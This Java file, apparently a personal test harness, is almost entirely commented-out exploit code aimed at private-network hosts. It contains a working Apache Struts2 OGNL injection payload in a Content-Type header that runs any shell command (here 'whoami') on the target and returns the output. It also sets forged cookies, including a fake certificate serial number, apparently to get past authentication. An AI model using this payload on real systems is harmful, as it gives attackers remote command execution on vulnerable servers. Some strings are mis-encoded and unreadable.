package com.THR.TestCookie;

//import org.apache.http.HttpEntity;
//import org.apache.http.client.CookieStore;
//import org.apache.http.client.methods.CloseableHttpResponse;
//import org.apache.http.client.methods.HttpGet;
//import org.apache.http.client.methods.HttpPost;
//import org.apache.http.impl.client.BasicCookieStore;
//import org.apache.http.impl.client.CloseableHttpClient;
//import org.apache.http.impl.client.HttpClients;
//import org.apache.http.impl.cookie.BasicClientCookie;
//import org.apache.http.util.EntityUtils;

public class Test {

	//public static void main(String[] args) throws Exception {
	//	//String url = "http://192.168.42.94/fileUpload!iframeUpload.action";
	//	String url = "http://192.168.42.221";
	//	get(url,"whoami");
	//	//System.out.println(URLEncoder.encode("1111","GBK"));
	//}
    //
	//private static void get(String url,String cmd) throws Exception {
	//	/*
	//	CookieStore cookieStore = new BasicCookieStore();
	//	BasicClientCookie cookie = new BasicClientCookie("JSESSIONID", "C15D7510DFAFAEE2FF55AF8B91A5CBD8A");
	//    cookie.setVersion(0);
	//    cookie.setDomain("192.168.42.94");
	//    cookie.setPath("/");
	//    cookieStore.addCookie(cookie);
	//    */
	//
	//    /*cookie = new BasicClientCookie("KOAL_CERT_SERIAL_NUMBER", "11111");
	//    cookie.setVersion(0);
	//    cookie.setDomain("192.168.42.94");
	//    cookie.setPath("/");
	//    cookieStore.addCookie(cookie);*/
	//
	//    /*cookie = new BasicClientCookie("CN", URLEncoder.encode("≤‚ ‘user1"));
	//    cookie.setVersion(0);
	//    cookie.setDomain("192.168.42.93");
	//    cookie.setPath("/");
	//
	//
	//    cookie = new BasicClientCookie("CN", URLEncoder.encode("≤‚ ‘user1"));
	//    cookie.setVersion(0);
	//    cookie.setDomain("192.168.42.93");
	//    cookie.setPath("/");
	//	cookieStore.addCookie(cookie);
	//	*/
	//	CookieStore cookieStore = new BasicCookieStore();//URLEncoder.encode("≤‚ ‘user1","GBK")
	//	BasicClientCookie cookie = new BasicClientCookie("CN", URLEncoder.encode("≤‚ ‘user1","GBK"));
	//	cookie.setVersion(0);
	//	cookie.setDomain("192.168.42.221");
	//	cookie.setPath("/");
	//	cookieStore.addCookie(cookie);
    //
	//	cookie = new BasicClientCookie("KOAL_CERT_SERIAL_NUMBER","11111110");
	//	cookie.setVersion(0);
	//	cookie.setDomain("192.168.42.221");
	//	cookie.setPath("/");
	//	cookieStore.addCookie(cookie);
    //
	//	/*cookie = new BasicClientCookie("CN", "9909090");
	//	cookie.setVersion(0);
	//	cookie.setDomain("192.168.42.221");
	//	cookie.setPath("/");
	//	cookieStore.addCookie(cookie);*/
    //
    //
	//	CloseableHttpClient httpclient = HttpClients.custom().setDefaultCookieStore(cookieStore).build();
	//	//CloseableHttpClient httpclient = HttpClients.custom().build();
	//	HttpPost post = new HttpPost(url);
    //
	//	//post.addHeader("Content-Type","%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
    //
	//	//HttpGet httpGet = new HttpGet(url);
	//	CloseableHttpResponse response = httpclient.execute(post);
	//	try {
	//		HttpEntity entity = response.getEntity();
	//		System.out.println(EntityUtils.toString(entity));
	//	} finally {
	//	    response.close();
	//	}
	//}
    //
	//private static void post(String url) throws Exception {
    //
	//}
}
